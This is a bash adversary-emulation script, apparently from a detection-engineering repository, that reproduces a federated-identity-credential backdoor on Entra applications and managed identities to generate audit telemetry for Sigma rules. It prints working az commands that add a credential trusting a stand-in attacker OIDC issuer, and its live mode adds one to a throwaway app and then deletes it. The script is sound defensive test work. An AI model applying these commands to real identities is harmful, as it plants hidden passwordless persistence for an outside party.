#!/usr/bin/env bash
# TRR9013 (T1098.001) behavioral emulation: federated identity credential (FIC)
# backdoor on an Entra application (Procedure A) and a user-assigned managed identity
# (Procedure C). Adding a FIC that trusts an attacker-controlled OIDC issuer lets an
# external workload mint tokens as the identity, passwordless.
#
#   * DOCUMENT/LIVE: with TRR9013_LIVE=1 and the Azure CLI signed in, creates a
#     THROWAWAY app / managed identity, adds a no-op FIC with an example.com issuer,
#     then deletes it. Needs your own tenant. NOT run in CI.
#   * FIXTURE: --show-fixture prints the committed Entra-audit / Azure-Activity fixtures
#     the CI validator runs the detections over.
#
# Rules: detections/sigma/T1098.001/entra_app_federated_credential_backdoor.yml (A/B)
#        detections/sigma/T1098.001/azure_managed_identity_federated_credential_backdoor.yml (C)
set -euo pipefail

PROC="${1:-a}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXDIR="$HERE/../../../detections/cloud/fixtures/trr9013"

if [[ "${1:-}" == "--show-fixture" || "${2:-}" == "--show-fixture" ]]; then
  echo "# app FIC (Entra audit):"; cat "$FIXDIR/attack.json"
  echo; echo "# managed-identity FIC (Azure Activity Log):"; cat "$FIXDIR/attack_mi.json"
  exit 0
fi

ISSUER="https://oidc.trr9013-attacker.example.com"   # RFC 2606 example.com: never a real tenant issuer
SUBJECT="repo:trr9013-attacker/*"

echo "== TRR9013.AZR.$PROC — federated identity credential backdoor =="
case "$PROC" in
  a) echo "A: add a FIC to an app registration (issuer $ISSUER)."
     echo "   az ad app federated-credential create --id <appId> \\"
     echo "     --parameters '{\"name\":\"trr9013-backdoor\",\"issuer\":\"$ISSUER\",\"subject\":\"$SUBJECT\",\"audiences\":[\"api://AzureADTokenExchange\"]}'" ;;
  c) echo "C: add a FIC to a user-assigned managed identity (Azure Activity Log)."
     echo "   az identity federated-credential create --name trr9013-mi-backdoor \\"
     echo "     --identity-name <mi> --resource-group <rg> --issuer $ISSUER --subject $SUBJECT \\"
     echo "     --audiences api://AzureADTokenExchange" ;;
  *) echo "usage: emulate_entra.sh {a|c} [--live|--show-fixture]"; exit 1 ;;
esac

if [[ "${TRR9013_LIVE:-0}" == "1" || "${2:-}" == "--live" ]]; then
  command -v az >/dev/null || { echo "az CLI not found"; exit 1; }
  echo
  echo "[live] creating a throwaway object, adding a no-op FIC, then deleting it..."
  if [[ "$PROC" == "a" ]]; then
    APP_ID=$(az ad app create --display-name trr9013-victim-app --query appId -o tsv)
    az ad app federated-credential create --id "$APP_ID" --parameters \
      "{\"name\":\"trr9013-backdoor\",\"issuer\":\"$ISSUER\",\"subject\":\"$SUBJECT\",\"audiences\":[\"api://AzureADTokenExchange\"]}"
    echo "[live] FIC added; review the Entra audit log 'Update application' event. Cleaning up..."
    az ad app delete --id "$APP_ID"
  else
    echo "[live] (Procedure C requires an existing resource group + managed identity; see the printed command.)"
  fi
  echo "[live] done."
else
  echo
  echo "(dry) set TRR9013_LIVE=1 with az signed in to run the throwaway add+cleanup,"
  echo "      or pass --show-fixture for the recorded telemetry."
fi
